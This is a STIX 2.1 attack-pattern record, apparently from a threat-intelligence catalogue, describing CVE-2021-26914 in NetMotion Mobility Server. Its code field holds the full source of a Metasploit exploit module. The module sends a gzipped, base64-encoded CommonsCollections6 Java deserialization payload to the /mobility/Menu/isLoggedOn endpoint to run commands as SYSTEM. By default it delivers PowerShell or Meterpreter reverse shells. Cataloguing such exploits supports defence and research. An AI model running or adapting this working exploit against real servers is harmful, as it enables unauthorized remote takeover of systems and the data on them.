{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--2ac77978-ecd8-4878-9ba3-47b610f23696",
    "created": "2024-08-14T16:52:47.284199Z",
    "modified": "2024-08-14T16:52:47.284203Z",
    "name": "NetMotion Mobility Server MvcUtil Java Deserialization",
    "description": " This module exploits an unauthenticated Java deserialization in the NetMotion Mobility server's MvcUtil.valueStringToObject() method, as invoked through the /mobility/Menu/isLoggedOn endpoint, to execute code as the SYSTEM account.  Mobility server versions 11.x before 11.73 and 12.x before 12.02 are vulnerable. Tested against 12.01.09045 on Windows Server 2016. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/http/netmotion_mobility_mvcutil_deserialization.rb",
            "external_id": "netmotion_mobility_mvcutil_deserialization.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2021-26914"
        },
        {
            "source_name": "reference",
            "url": "https://ssd-disclosure.com/ssd-advisory-netmotion-mobility-server-multiple-deserialization-of-untrusted-data-lead-to-rce/"
        },
        {
            "source_name": "reference",
            "url": "https://www.netmotionsoftware.com/security-advisories/security-vulnerability-in-mobility-web-server-november-19-2020"
        },
        {
            "source_name": "reference",
            "url": "https://srcincite.io/advisories/src-2021-0007/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n\n  Rank = ExcellentRanking\n\n  prepend Msf::Exploit::Remote::AutoCheck\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::JavaDeserialization\n  include Msf::Exploit::CmdStager\n  include Msf::Exploit::Powershell\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'NetMotion Mobility Server MvcUtil Java Deserialization',\n        'Description' => %q{\n          This module exploits an unauthenticated Java deserialization in the\n          NetMotion Mobility server's MvcUtil.valueStringToObject() method, as\n          invoked through the /mobility/Menu/isLoggedOn endpoint, to execute\n          code as the SYSTEM account.\n\n          Mobility server versions 11.x before 11.73 and 12.x before 12.02 are\n          vulnerable. Tested against 12.01.09045 on Windows Server 2016.\n        },\n        'Author' => [\n          'mr_me', # Discovery and PoC\n          'wvu' # Module\n        ],\n        'References' => [\n          ['CVE', '2021-26914'],\n          ['URL', 'https://ssd-disclosure.com/ssd-advisory-netmotion-mobility-server-multiple-deserialization-of-untrusted-data-lead-to-rce/'],\n          ['URL', 'https://www.netmotionsoftware.com/security-advisories/security-vulnerability-in-mobility-web-server-november-19-2020'],\n          ['URL', 'https://srcincite.io/advisories/src-2021-0007/']\n        ],\n        'DisclosureDate' => '2021-02-08', # Public disclosure\n        'License' => MSF_LICENSE,\n        'Platform' => 'win',\n        'Arch' => [ARCH_CMD, ARCH_X86, ARCH_X64],\n        'Privileged' => true,\n        'Targets' => [\n          [\n            'Windows Command',\n            {\n              'Arch' => ARCH_CMD,\n              'Type' => :win_cmd,\n              'DefaultOptions' => {\n                'PAYLOAD' => 'cmd/windows/powershell_reverse_tcp'\n              }\n            }\n          ],\n          [\n            'Windows Dropper',\n            {\n              'Arch' => [ARCH_X86, ARCH_X64],\n              'Type' => :win_dropper,\n              'DefaultOptions' => {\n                'PAYLOAD' => 'windows/x64/meterpreter/reverse_https'\n              }\n            }\n          ],\n          [\n            'PowerShell Stager',\n            {\n              'Arch' => [ARCH_X86, ARCH_X64],\n              'Type' => :psh_stager,\n              'DefaultOptions' => {\n                'PAYLOAD' => 'windows/x64/meterpreter/reverse_https'\n              }\n            }\n          ]\n        ],\n        'DefaultTarget' => 2,\n        'DefaultOptions' => {\n          'RPORT' => 443,\n          'SSL' => true\n        },\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [REPEATABLE_SESSION],\n          'SideEffects' => [\n            IOC_IN_LOGS, # C:\\Program Files\\NetMotion Server\\logs\n            ARTIFACTS_ON_DISK # CmdStager\n          ]\n        }\n      )\n    )\n\n    register_options([\n      OptString.new('TARGETURI', [true, 'Base path', '/'])\n    ])\n  end\n\n  def check\n    res = send_request_cgi(\n      'method' => 'GET',\n      'uri' => normalize_uri(target_uri.path)\n    )\n\n    unless (version = parse_version(res))\n      return CheckCode::Unknown('Failed to parse version from response.')\n    end\n\n    unless vuln_version?(version)\n      return CheckCode::Safe(\"NetMotion Mobility #{version} is patched.\")\n    end\n\n    CheckCode::Appears(\"NetMotion Mobility #{version} is unpatched.\")\n  end\n\n  def parse_version(res)\n    return unless res&.code == 200\n\n    # <img src='/images/menu_logo.png?version=12.01.09045' alt='Mobility' border='0' class='navLogo'>\n    res.get_html_document.at('//img[@alt = \"Mobility\"]/@src').to_s[\n      %r{^/images/menu_logo\\.png\\?version=(?<version>[\\d.]+)$},\n      :version # Hat tip @adfoster-r7\n    ]\n  end\n\n  def vuln_version?(version)\n    @vuln_versions ||=\n      (11.0...11.73).step(0.01) + # 11.0 through 11.72\n      (12.0...12.02).step(0.01) # 12.0 through 12.01\n\n    @vuln_versions.include?(version.to_f)\n  end\n\n  def exploit\n    print_status(\"Executing #{payload_instance.refname} (#{target.name})\")\n\n    case target['Type']\n    when :win_cmd\n      execute_command(payload.encoded)\n    when :win_dropper\n      execute_cmdstager\n    when :psh_stager\n      execute_command(\n        cmd_psh_payload(\n          payload.encoded,\n          payload.arch.first,\n          remove_comspec: true\n        )\n      )\n    end\n  end\n\n  def execute_command(cmd, _opts = {})\n    # XXX: %Path% is otherwise *only* C:\\Program Files\\NetMotion Server\n    cmd.prepend(\n      'set Path=%Path%;' \\\n      'C:\\Windows\\System32' \\\n      ';' \\\n      'C:\\Windows\\System32\\WindowsPowerShell\\v1.0' \\\n      '&&'\n    )\n\n    vprint_status(cmd)\n\n    res = send_request_cgi(\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, '/mobility/Menu/isLoggedOn'),\n      'vars_post' => {\n        'Mvc_x_Form_x_Name' => go_go_gadget(cmd)\n      }\n    )\n\n    unless res&.code == 200 && res.body == 'false' # If JSESSIONID is missing\n      fail_with(Failure::PayloadFailed, cmd)\n    end\n  end\n\n  def go_go_gadget(cmd)\n    Rex::Text.encode_base64(\n      Rex::Text.gzip(\n        generate_java_deserialization_for_command(\n          'CommonsCollections6',\n          'cmd', # cmd.exe\n          cmd\n        )\n      )\n    )\n  end\n\nend\n",
    "x_mitre_disclosure_date": "2021-02-08, # Public disclosure",
    "x_mitre_platforms": [
        "win'"
    ]
}